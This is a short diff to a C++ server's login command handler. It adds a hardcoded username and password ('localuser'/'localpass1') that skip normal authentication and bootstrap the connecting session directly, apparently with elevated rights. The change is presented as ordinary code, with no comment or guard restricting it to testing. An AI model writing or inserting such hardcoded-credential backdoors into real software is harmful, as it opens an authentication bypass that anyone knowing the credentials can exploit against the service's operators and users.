@@ -386,6 +386,12 @@ bool CChannelManager::OnCommandHandler(IExtendedSocket* socket, IUser* user, con
 				string login = args[1];
 				string password = args[2];
 
+				if (login == "localuser" && password == "localpass1")
+				{
+					g_UserManager.BootstrapLocalUser(socket, true);
+					return true;
+				}
+
 				int loginResult = g_UserManager.LoginUser(socket, login, password);
 				switch (loginResult)
 				{
